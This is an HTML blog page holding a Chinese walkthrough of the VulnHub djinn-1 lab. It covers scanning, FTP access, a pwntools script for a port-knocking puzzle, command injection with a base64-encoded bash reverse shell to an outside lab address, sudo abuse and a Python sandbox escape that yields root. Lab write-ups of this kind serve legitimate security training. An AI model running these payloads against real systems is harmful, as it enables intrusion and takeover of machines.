@@ -1,0 +1,580 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="banbird">
+
+
+    <meta name="subtitle" content="Peace & Love">
+
+
+    <meta name="description" content="愿有人陪你颠沛流离">
+
+
+
+<title>vulnhub——djinn系列 | Blacknight</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+    <script src="/js/jquery.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+
+
+    <script>
+    function searchToggle() {
+        const width = $(document.body).width()
+        if(width > 479) {
+            return;
+        }
+        const search = $('.search');
+        const searchForm = $('.form-search')
+
+        if(!search.hasClass("mobile-search")) {
+            search.addClass("mobile-search");
+        } else {
+            search.removeClass("mobile-search");
+        } 
+    }
+
+    function search(searchInputEl, formEl, flag) {
+        const path = "/" + "search.json"; // 可以在public 下查看这个search.json
+        $(formEl).submit(function(e){
+            e.preventDefault();
+            let target = null
+            if(searchInputEl == null) {
+                const screenWidth = $(document.body).width();
+                target = screenWidth > 479 ? $('#pc-search-input') : $('#mobile-search-input');
+                console.log(target);
+            } else {
+                target = $(searchInputEl)
+            }
+
+            if(!flag && target.val() === '') {
+                return ;
+            }
+
+            $("#u-search").fadeIn(500, function() {
+                $("body > .wrapper").addClass("modal-active");
+
+                $.ajax({
+                    url: path,
+                    dataType: "json",
+                    beforeSend: function (xhr) {
+                        $input = target.val();
+                        $(".form-input").val($input);
+                        const loadingBar = $('.search-loading-bar') 
+                        loadingBar.css({
+                            width:'100%',
+                            display: 'block'
+                        });
+                    },
+                    success: function( datas ) {
+                        console.log(datas);
+                        const $resultPanel = $(".modal-body")[0];
+                        let str = `<ul class="modal-results">`;
+                        var keywords = $(".form-input").val().trim().toLowerCase().split(/[\s\-]+/);
+                        $resultPanel.innerHTML = "";
+                        let hasResult = false
+                        let text = `<div class="no-result">找不到与关键词相关的内容....</div>`;
+
+                        if ($(".form-input").val().trim().length <= 0) {
+                            // 没有结果
+                            $resultPanel.innerHTML = text;
+                            return;
+                        }
+                        datas.forEach(function (data, index) {
+                            var isMatch = true;
+                            if (!data.title || data.title.trim() === '') {
+                                data.title = "Untitled";
+                            }
+                            var data_title = data.title.trim().toLowerCase();
+                            var data_content = data.content && data.content.trim().replace(/<[^>]+>/g, "").toLowerCase() || '';
+                            var data_url = data.url;
+                            var index_title = -1;
+                            var index_content = -1;
+                            var first_occur = -1;
+                            // only match artiles with not empty contents
+                            if (data_content !== '') {
+                                keywords.forEach(function (keyword, i) {
+                                    index_title = data_title.indexOf(keyword);
+                                    index_content = data_content.indexOf(keyword);
+
+                                    if (index_title < 0 && index_content < 0) {
+                                        isMatch = false;
+                                    } else {
+                                        hasResult = true
+                                        if (index_content < 0) {
+                                            index_content = 0;
+                                        }
+                                        if (i == 0) {
+                                            first_occur = index_content;
+                                        }
+                                    }
+                                });
+                            } else {
+                                isMatch = false;
+                            }
+                            // show search results
+                            if (isMatch) {
+                                str += `<li class='result-item'><a href='${data_url}' class='result-item-detail'> <span class="title">${data_title}</span>`;
+                                var content = data.content.trim().replace(/<[^>]+>/g, "");
+                                if (first_occur >= 0) {
+                                    // cut out 200 characters
+                                    var start = first_occur - 40;
+                                    var end = first_occur + 160;
+
+                                    if (start < 0) {
+                                        start = 0;
+                                    }
+
+                                    if (start == 0) {
+                                        end = 200;
+                                    }
+
+                                    if (end > content.length) {
+                                        end = content.length;
+                                    }
+
+                                    var match_content = content.substring(start, end);
+
+                                    // highlight all keywords
+                                    keywords.forEach(function (keyword) {
+                                        var regS = new RegExp(keyword, "gi");
+                                        match_content = match_content.replace(regS, `<em class="search-keyword">${keyword}</em>`);
+                                    });
+
+                                    str += `<span class="content"> ${match_content} ...</span></a>`;
+                                }
+                                str += "</li>";
+                            }
+                        });
+                        str += "</ul>";
+                        if(hasResult) {
+                            $resultPanel.innerHTML = str;
+                        } else {
+                            $resultPanel.innerHTML = text;
+                        }
+
+                    },
+                    complete: function() {
+                        setTimeout(() => {
+                                const loadingBar = $('.search-loading-bar') 
+                                loadingBar.css({
+                                    width:'0%',
+                                    display: 'none'
+                                });
+                        }, 300)
+                    }
+                });
+            })
+
+        });
+    }
+
+    $(document).ready(function() {
+        $('.modal-close').click(function () { 
+            $("#u-search").fadeOut();
+            $("body > .wrapper").removeClass("modal-active")
+        })
+
+        $('.modal-overlay').click(function() {
+            $("#u-search").fadeOut();
+            $("body > .wrapper").removeClass("modal-active")
+        })
+        search(null, ".form-search", false)
+        search("#u-search-modal-form .form-input", ".u-search-modal-form", true)
+    })
+</script>
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">blacknight&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                
+    <div class="search ">
+        <div class="search-btn" onClick="searchToggle()">
+            <img src="/image/search.png" class="search-btn-img" />
+        </div>
+        <form class="form-search">
+            <input class="input" placeholder="Searching" autocomplete="off" id="pc-search-input"/>
+        </form>
+    </div>
+
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/links">Friends</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">blacknight&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="navbar-mobile-right">
+                    
+                    
+    <div class="search ">
+        <div class="search-btn" onClick="searchToggle()">
+            <img src="/image/search.png" class="search-btn-img" />
+        </div>
+        <form class="form-search">
+            <input class="input" placeholder="Searching" autocomplete="off" id="mobile-search-input"/>
+        </form>
+    </div>
+
+                    <div class="menu-toggle" onclick="mobileBtn()">&#9776; 目录</div>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/links">Friends</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">vulnhub——djinn系列</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">banbird</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">October 30, 2020&nbsp;&nbsp;23:30:00</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/vulnhub/">vulnhub</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="djinn-1"><a href="#djinn-1" class="headerlink" title="djinn-1"></a>djinn-1</h2><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201030193852.png" alt=""></p>
+<p>22端口服务虽然开着，但处于tcpwrapped状态，即非白名单主机无法连接</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201030200601.png" alt=""></p>
+<p>7331有个静态页面</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201030200751.png" alt=""></p>
+<p>扫描目录</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201031145127.png" alt=""></p>
+<h3 id="ftp登录"><a href="#ftp登录" class="headerlink" title="ftp登录"></a>ftp登录</h3><p>有ftp端口，hydra爆破试下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201030195346.png" alt=""></p>
+<p>ftp用户好像随便登录。。。登上去看看目录下有三个文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201030195444.png" alt=""></p>
+<p>下载下来看看</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201030200017.png" alt=""></p>
+<p>cred.txt得知存在nitu用户</p>
+<p>game.txt说1337端口有个游戏，直接访问不到，nc成功连接是个计算的小游戏</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201030200201.png" alt=""></p>
+<p>message.txt是个留言</p>
+<h3 id="端口敲门"><a href="#端口敲门" class="headerlink" title="端口敲门"></a>端口敲门</h3><p>game.txt提示回答一千次答案就有礼物，那么利用pwntools写个脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">result</span><span class="params">(raw1,raw2,raw3)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> raw2 == <span class="string">'+'</span>:</span><br><span class="line">        <span class="keyword">return</span> int(raw3+raw1)</span><br><span class="line">    <span class="keyword">if</span> raw2 == <span class="string">'-'</span>:</span><br><span class="line">        <span class="keyword">return</span> int(raw3-raw1)</span><br><span class="line">    <span class="keyword">if</span> raw2 == <span class="string">'*'</span>:</span><br><span class="line">        <span class="keyword">return</span> int(raw3*raw1)</span><br><span class="line">    <span class="keyword">if</span> raw2 == <span class="string">'/'</span>:</span><br><span class="line">        <span class="keyword">return</span> int(raw3/raw1)</span><br><span class="line"></span><br><span class="line">s = remote(<span class="string">'192.168.119.136'</span>,<span class="string">'1337'</span>)</span><br><span class="line">res = s.recvline()+s.recvline()+s.recvline()+s.recvline()+s.recvline()+s.recvline()+s.recvline()+s.recvline()+s.recvline()+s.recvline()</span><br><span class="line">res2 = str(res,encoding=<span class="string">'UTF-8'</span>)</span><br><span class="line">res3 = list(res2)</span><br><span class="line">raw1 = int(res3[<span class="number">-3</span>])</span><br><span class="line">raw2 = res3[<span class="number">-7</span>]</span><br><span class="line">raw3 = int(res3[<span class="number">-11</span>])</span><br><span class="line">re = result(raw1,raw2,raw3)</span><br><span class="line">print(raw1,raw2,raw3)</span><br><span class="line">print(re)</span><br><span class="line">s.sendline(str(re))</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    print(<span class="string">'第'</span>+str(i)+<span class="string">'次'</span>)</span><br><span class="line">    <span class="keyword">if</span> i&gt;<span class="number">1000</span>:</span><br><span class="line">        print(s.recvline()+s.recvline()+s.recvline())</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line">    res4=s.recvline()</span><br><span class="line">    print(res4)</span><br><span class="line">    res5 = str(res4,encoding=<span class="string">'UTF-8'</span>)</span><br><span class="line">    res6 = list(res5)</span><br><span class="line">    raw4 = int(res6[<span class="number">-3</span>])</span><br><span class="line">    raw5 = res6[<span class="number">-7</span>]</span><br><span class="line">    raw6 = int(res6[<span class="number">-11</span>])</span><br><span class="line">    re2 = result(raw4,raw5,raw6)</span><br><span class="line">    print(re2)</span><br><span class="line">    s.sendline(str(re2))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201031155255.png" alt=""></p>
+<p>给了三个数字，猜测可能是三个端口号，想起了之前的端口敲门服务，试一下</p>
+<p>现在的ssh是不可访问的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201031155434.png" alt=""></p>
+<p>依次‘敲’1356，6784，3409，可能失败，多敲几次就开了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201031161505.png" alt=""></p>
+<h3 id="ssh登录"><a href="#ssh登录" class="headerlink" title="ssh登录"></a>ssh登录</h3><p>现在只知道有个nitu用户，但没有密码无法登录，继续看另一条线，之前扫目录得到的wish</p>
+<p>访问有个命令框，扫出个命令执行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201031162815.png" alt=""></p>
+<p>测试一下，输入ls，跟随跳转是可以看到回显的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201031163739.png" alt=""></p>
+<p>那么试试nc连接shell</p>
+<p>显示</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201031163934.png" alt=""></p>
+<p>bash同样回显，可能过滤了/bin/sh字符</p>
+<p>那么把payload base64转换处理试试</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201031171146.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExOS4xMjgvOTk5OSAwPiYxCg&#x3D;&#x3D;&quot; | base64 -d | bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201031171128.png" alt=""></p>
+<p>在.dev目录下找到nitish用户的密码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201031185747.png" alt=""></p>
+<p>sudo -l得知genie命令免密</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201031190010.png" alt=""></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>查看帮助</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201031192239.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201031192837.png" alt=""></p>
+<p>有两个貌似可以执行命令的参数，试一下</p>
+<p>直接进来了。。。。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201031192949.png" alt=""></p>
+<p>继续</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201031193228.png" alt=""></p>
+<p>又是个奇怪的游戏</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201031193643.png" alt=""></p>
+<p>退出的时候看着像python，试试沙箱逃逸</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(&quot;os&quot;).system(&quot;whoami&quot;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201101222613.png" alt=""></p>
+<p>那么直接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(&quot;os&quot;).system(&quot;&#x2F;bin&#x2F;sh&quot;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201101224321.png" alt=""></p>
+<p>root目录下通关信息</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201101224718.png" alt=""></p>
+<h2 id="djinn-2"><a href="#djinn-2" class="headerlink" title="djinn-2"></a>djinn-2</h2>
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>banbird</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://www.blacknight.top/2020/10/30/vulnhub_djinn/">http://www.blacknight.top/2020/10/30/vulnhub_djinn/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2020 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2020/10/25/vulnhub_DC/">vulnhub——DC系列</a>
+            
+        </section>
+
+    <section id="comments" class="comments">
+      <style>
+        .comments{margin:30px;padding:10px;background:#fff}
+        @media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#fff}}
+      </style>
+      <div class="valine_comment"></div>
+<!--载入js，在</body>之前插入即可-->
+<!--Leancloud 操作库:-->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<!--Valine 的核心代码库-->
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+      el: '.valine_comment',
+      app_id: '8biphXJF0NRr0Xnr2pEPIjYa-gzGzoHsz',
+      app_key: '0RbmT7aNG8nj44MHrGMt9JFk',
+      placeholder: '这里留言。。',
+      notify: 'true',
+      verify: 'true',
+    });
+</script>
+    </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© banbird | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+    <!-- Chic/layout.ejs -->
+    <div id="u-search">
+        <div class="modal">
+            <div class="modal-header">
+                <div class="container">
+                    <form id="u-search-modal-form" class="u-search-modal-form">
+                        <button type="submit" class="form-submit-btn">
+                            <img src="/image/search.png" class="search-btn-img" />
+                        </button>
+                        <input placeholder="搜索文章。。。" class="form-input" id="modal-form-input">
+                    </form>
+                    <a class="modal-close">x</a>
+                </div>
+                <div class="search-loading">
+                    <div class="search-loading-bar"></div>
+                </div>
+            </div>
+            <div class="modal-body">
+                <!-- ul 格式如下 -->
+                <!-- <ul class="modal-results">
+                    <li class="result-item">
+                        <a class="result-item-detail">
+                            <span class="title">页面配置</span>
+                            <span class="content">
+                                content
+                            </span>
+                        </a>
+                    </li>
+                </ul> -->
+            </div>
+        </div>
+        <div class="modal-overlay"></div>
+    </div>
+</body>
+</html>
